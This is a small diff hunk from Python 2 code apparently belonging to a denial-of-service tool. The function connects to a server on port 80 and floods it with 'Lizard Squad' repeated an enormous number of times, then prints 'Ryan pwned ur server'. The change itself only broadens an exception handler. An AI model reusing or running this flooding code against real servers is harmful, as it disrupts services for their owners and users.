@@ -86,7 +86,7 @@ def httpcall(url):
 			s.connect((url,80))
 			s.send("Lizard Squad" * 109951162777600)
 			
-	except socket.error as e:
+	except:
 			#print e.code
 			print 'Ryan pwned ur server'
 			code=500
